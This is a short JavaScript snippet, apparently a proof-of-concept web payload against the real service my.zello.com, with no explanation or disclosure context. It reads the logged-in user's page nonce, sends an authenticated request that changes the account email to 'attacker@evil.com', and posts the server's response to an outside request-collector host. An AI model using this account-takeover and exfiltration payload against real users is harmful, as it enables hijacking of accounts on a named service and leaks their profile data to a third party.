/*fetch('/user/update_profile', {
   method: 'POST',
   body: new URLSearchParams({
     email: 'testemail@gmail.com',
     phone: '',
     safe_info_pass_update: 0,
     nonce: Zello['nonce']   
   }),
   credentials: 'include'
});
*/
// Navigate to home page to get access to Zello object
window.location.href = 'https://my.zello.com/user/home';

// Then on that page, execute:
const nonce = Zello['nonce'];
fetch('https://my.zello.com/user/update_profile', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: new URLSearchParams({
    email: 'attacker@evil.com',
    phone: '',
    safe_info_pass_update: 0,
    nonce: nonce
  }),
  credentials: 'include'
})
.then(r => r.json())
.then(d => fetch('https://ywhftw.free.beeceptor.com/', {
  method: 'POST', //optional 
  body: JSON.stringify(d),
  mode: 'no-cors'
}));
